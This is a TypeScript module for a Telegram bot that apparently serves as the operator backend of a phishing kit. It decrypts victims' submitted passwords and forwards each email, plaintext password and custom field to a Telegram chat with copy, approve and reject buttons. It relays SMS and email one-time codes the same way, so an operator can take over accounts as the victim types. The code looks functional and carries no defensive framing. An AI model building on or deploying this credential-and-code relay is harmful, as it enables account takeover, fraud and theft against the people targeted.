import { bot } from "../clients/grammy.client.js";
import { Lead, providerNames } from "../schemas/lead.schemas.js";
import { InlineKeyboard } from "grammy";
import { constants, privateDecrypt } from "node:crypto";
import {
  LeadSessionState,
  restartLeadSession,
  updateLeadSession,
} from "./lead.methods.js";
import {
  callbackActions,
  reviewCallbackData,
  sanitizeCallbackDataField,
} from "./callback.methods.js";
import { sendSessionToTelegram } from "./session.methods.js";
import { Update } from "grammy/types";

const EXPIRED_SESSION_MESSAGE = "Session expired. Reload page and try again.";
const UNREADABLE_CREDENTIALS_MESSAGE =
  "We couldn't read those credentials. Reload the page and try again.";

export function isProductionRuntime(): boolean {
  return Boolean(process.env.VERCEL) || process.env.NODE_ENV === "production";
}

export function getTelegramMode(): "webhook" | "polling" | "disabled" {
  const configured = process.env.TELEGRAM_MODE?.trim().toLowerCase();
  if (configured === "disabled") return "disabled";
  if (isProductionRuntime()) return "webhook";
  if (configured === "polling") return "polling";
  if (configured === "webhook") return "webhook";
  return "disabled";
}

export function getTelegramWebhookConfig() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const secret = process.env.TELEGRAM_WEBHOOK_SECRET;
  const host = process.env.VERCEL_PROJECT_PRODUCTION_URL;
  if (!token || !host) {
    throw new Error(
      "Missing env vars: TELEGRAM_BOT_TOKEN and VERCEL_PROJECT_PRODUCTION_URL are required.",
    );
  }
  const url = `https://${host.replace(/\/+$/, "")}/api/telegram/webhook`;
  if (secret && !/^[A-Za-z0-9_-]{1,256}$/.test(secret)) {
    throw new Error(
      "TELEGRAM_WEBHOOK_SECRET must be 1-256 chars: letters, digits, underscores, hyphens.",
    );
  }
  if (!secret && isProductionRuntime()) {
    throw new Error(
      "TELEGRAM_WEBHOOK_SECRET is required in production: without it anyone who learns the webhook URL can approve or reject leads.",
    );
  }
  return { token, secret, url };
}

export function canReadTelegramUpdate(value: unknown): value is Update {
  function isRecord(value: unknown): value is Record<string, unknown> {
    return typeof value === "object" && value !== null && !Array.isArray(value);
  }
  if (!isRecord(value) || !Number.isInteger(value.update_id)) return false;
  const updateTypes = Object.keys(value).filter((key) => key !== "update_id");
  if (updateTypes.length !== 1) return false;
  if (updateTypes[0] === "callback_query" && isRecord(value.callback_query)) {
    const callback = value.callback_query;
    if (
      typeof callback.id === "string" &&
      isRecord(callback.from) &&
      Number.isInteger(callback.from.id) &&
      typeof callback.data === "string"
    ) {
      return true;
    }
  }
  if (updateTypes[0] === "message" && isRecord(value.message)) {
    const message = value.message;
    if (
      Number.isInteger(message.message_id) &&
      isRecord(message.chat) &&
      (typeof message.chat.id === "number" ||
        typeof message.chat.id === "string")
    ) {
      return true;
    }
  }
  return false;
}

function decryptAuthToken(authToken: string): string {
  const privateKey = process.env.PHOENYX_PRIVATE_KEY?.replace(/\\n/g, "\n");
  if (!privateKey) {
    console.error("PHOENYX_PRIVATE_KEY is not configured.");
    throw new Error(UNREADABLE_CREDENTIALS_MESSAGE);
  }
  let decrypted: Buffer;
  try {
    decrypted = privateDecrypt(
      {
        key: privateKey,
        padding: constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256",
      },
      Buffer.from(authToken, "base64"),
    );
  } catch (error) {
    console.error("Could not decrypt the lead auth token:", error);
    throw new Error(UNREADABLE_CREDENTIALS_MESSAGE);
  }
  const password = decrypted.toString("utf8");
  if (!password.trim()) {
    console.error("Decrypted lead auth token is empty.");
    throw new Error(UNREADABLE_CREDENTIALS_MESSAGE);
  }
  return password;
}

export async function requestTelegramLeadReview(
  sessionId: string,
  lead: Lead,
): Promise<LeadSessionState> {
  const decryptedPass = decryptAuthToken(lead.authToken);
  const email = sanitizeCallbackDataField(lead.email);
  const password = sanitizeCallbackDataField(decryptedPass);
  await restartLeadSession(sessionId, {
    status: "loading",
    keepMessageId: true,
  });
  const session = await updateLeadSession(sessionId, {
    status: "loading",
    process: "auth",
    feedback: "Authenticating your credentials...",
    credentials: [
      `Provider - ${providerNames[lead.provider]}`,
      `Email - ${email}`,
      `Password - ${password}`,
      lead.customField &&
        `${sanitizeCallbackDataField(lead.customField.name)} - ${sanitizeCallbackDataField(lead.customField.value)}`,
    ]
      .filter(Boolean)
      .join("\n\n"),
  });
  if (!session) {
    console.error("Invalid sessionId or expired session.");
    throw Error(EXPIRED_SESSION_MESSAGE);
  }
  const result = await sendSessionToTelegram(session, {
    resend: true,
    inlineKeyboard: new InlineKeyboard()
      .copyText("Copy email", lead.email)
      .row()
      .copyText("Copy password", decryptedPass)
      .row()
      .text(
        "❌ Invalid Email",
        reviewCallbackData(sessionId, callbackActions.authFlagEmail),
      )
      .row()
      .text("Reject", reviewCallbackData(sessionId, callbackActions.authReject))
      .danger()
      .text(
        "Approve",
        reviewCallbackData(sessionId, callbackActions.authApprove),
      )
      .success(),
  });
  const updated = await updateLeadSession(sessionId, result);
  if (!updated) throw Error(EXPIRED_SESSION_MESSAGE);
  return updated;
}

export async function requestTelegramCodeLeadReview(
  sessionId: string,
  codeLead: {
    type: "sms" | "email";
    code: string;
  },
): Promise<LeadSessionState> {
  const sms = codeLead.type === "sms";
  const session = await updateLeadSession(sessionId, {
    status: "loading",
    process: sms ? "verify-sms-code" : "verify-email-code",
    feedback: sms ? "Verifying SMS code..." : "Verifying email code...",
    logEntry: `${sms ? "SMS code" : "email code"} - ${sanitizeCallbackDataField(codeLead.code)}`,
  });
  if (!session) {
    console.error("Invalid sessionId or expired session.");
    throw Error(EXPIRED_SESSION_MESSAGE);
  }
  const result = await sendSessionToTelegram(session, {
    resend: true,
    inlineKeyboard: new InlineKeyboard()
      .copyText("Copy code", codeLead.code)
      .row()
      .text(
        "Reject",
        reviewCallbackData(
          sessionId,
          sms
            ? callbackActions.verifySmsReject
            : callbackActions.verifyEmailReject,
        ),
      )
      .danger()
      .text(
        "Approve",
        reviewCallbackData(
          sessionId,
          sms
            ? callbackActions.verifySmsApprove
            : callbackActions.verifyEmailApprove,
        ),
      )
      .success(),
  });
  const updated = await updateLeadSession(sessionId, result);
  if (!updated) throw Error(EXPIRED_SESSION_MESSAGE);
  return updated;
}

export async function startTelegramPolling(): Promise<void> {
  const configured = process.env.TELEGRAM_MODE?.trim().toLowerCase();
  if (configured !== "polling") return;
  if (isProductionRuntime()) {
    throw new Error(
      "Telegram long polling is only available in local development.",
    );
  }
  const webhook = await bot.api.getWebhookInfo();
  if (webhook.url) {
    throw new Error(
      "This bot already has a webhook. Remove it before enabling local polling.",
    );
  }
  void bot
    .start({
      onStart: () => console.log("Telegram bot started in local polling mode."),
    })
    .catch((error: unknown) => {
      console.error("Telegram polling failed:", error);
    });
  const shutdown = () => {
    void bot
      .stop()
      .catch((error: unknown) => {
        console.error("Telegram shutdown failed:", error);
      })
      .finally(() => process.exit(0));
  };
  process.once("SIGINT", shutdown);
  process.once("SIGTERM", shutdown);
}
